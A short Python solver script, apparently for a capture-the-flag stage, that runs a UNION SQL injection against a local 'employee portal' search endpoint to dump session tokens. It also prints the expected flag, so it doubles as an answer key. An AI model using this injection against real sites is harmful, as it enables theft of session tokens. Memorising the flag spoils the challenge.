#!/usr/bin/env python3
"""Stage 4 solver - UNION-based SQL injection against the employee portal.
Usage: python3 stage4_web.py [http://localhost:5000]
"""
import sys, re, urllib.parse, urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"

def search(payload):
    url = BASE + "/search?name=" + urllib.parse.quote(payload)
    return urllib.request.urlopen(url, timeout=10).read().decode(errors="replace")

# UNION the flag out of the sessions table (column 2 is rendered as "Name")
html = search("' UNION SELECT 1,token,3,4 FROM sessions-- -")
m = re.search(r"ROGUE\{[^}]+\}", html)
print(m.group(0) if m else "[!] flag not found - enumerate tables first with sqlite_master")
# -> ROGUE{sess_8f3a1c9e2b7d4f60}
